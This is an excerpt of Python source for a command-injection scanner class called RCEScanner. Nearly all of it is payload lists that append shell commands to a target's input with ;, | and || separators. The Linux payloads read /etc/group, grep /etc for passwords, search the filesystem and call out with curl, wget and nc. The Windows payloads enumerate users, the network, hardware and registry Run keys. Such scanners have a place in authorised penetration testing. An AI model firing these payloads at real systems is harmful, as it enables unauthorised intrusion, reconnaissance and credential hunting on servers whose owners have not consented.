...
class RCEScanner:
    ...
    def __init__(self, target: str, verbose: bool = False):
        ...
        self.success_indicators = [
            # Unix/Linux
            "uid=", "root", "admin", "user", "whoami", "id", "ls", "dir",
            "echo", "pwd", "hostname", "uname", "date", "cal", "df", "du",
            "ps aux", "netstat", "ifconfig", "ip a", "system", "exec", "shell_exec",
            "passthru", "popen", "proc_open", "pcntl_exec", "system(",
            # Windows
            "Microsoft Windows", "Windows NT", "Volume Serial Number",
            "Directory of", "C:\\", "D:\\", "Program Files", "System32",
            "cmd.exe", "powershell.exe", "reg.exe", "wmic", "net user",
            # Common
            "vulnerable", "test", "rce", "command executed",
            "executed successfully", "output", "result", "success"
        ]
    ...
    def _load_internal_payloads(self) -> List[str]:
        ...
        linux_cmds = [
            ...
            ";cat /etc/group", "|cat /etc/group", "||cat /etc/group",
            ...
            ";echo vulnerable > /tmp/test", "|echo vulnerable > /tmp/test",
            ";curl http://example.com", "|curl http://example.com",
            ";wget http://example.com", "|wget http://example.com",
            ";nc -v example.com 80", "|nc -v example.com 80",
            ";telnet example.com 80", "|telnet example.com 80",
            ...
            ";route -n", "|route -n", "||route -n",
            ";arp -a", "|arp -a", "||arp -a",
            ";ifconfig", "|ifconfig", "||ifconfig",
            ";ip addr", "|ip addr", "||ip addr",
            ";ip route", "|ip route", "||ip route",
            ";ss -tulpn", "|ss -tulpn", "||ss -tulpn",
            ";netstat -tulpn", "|netstat -tulpn", "||netstat -tulpn",
            ";lsof -i", "|lsof -i", "||lsof -i",
            ";fdisk -l", "|fdisk -l", "||fdisk -l",
            ";mount", "|mount", "||mount",
            ";df -a", "|df -a", "||df -a",
            ";du -sh /*", "|du -sh /*", "||du -sh /*",
            ";find / -name '*.txt'", "|find / -name '*.txt'",
            ";grep -r 'password' /etc/", "|grep -r 'password' /etc/"
        ]
        ...
        windows_cmds = [
            ";dir", "|dir", "||dir", "&dir", "&&dir",
            ";echo %USERNAME%", "|echo %USERNAME%", "||echo %USERNAME%",
            ...
            ";ipconfig /all", "|ipconfig /all", "||ipconfig /all",
            ";route print", "|route print", "||route print",
            ";arp -a", "|arp -a", "||arp -a",
            ";nslookup google.com", "|nslookup google.com",
            ";ping -n 1 8.8.8.8", "|ping -n 1 8.8.8.8",
            ";ping -n 1 google.com", "|ping -n 1 google.com",
            ...
            ";wmic os get caption", "|wmic os get caption",
            ";wmic cpu get name", "|wmic cpu get name",
            ";wmic memorychip get capacity", "|wmic memorychip get capacity",
            ";wmic diskdrive get model", "|wmic diskdrive get model",
            ";wmic bios get serialnumber", "|wmic bios get serialnumber",
            ";reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            ";reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            ";reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            ";powershell -c Get-Process", "|powershell -c Get-Process",
            ";powershell -c Get-Service", "|powershell -c Get-Service",
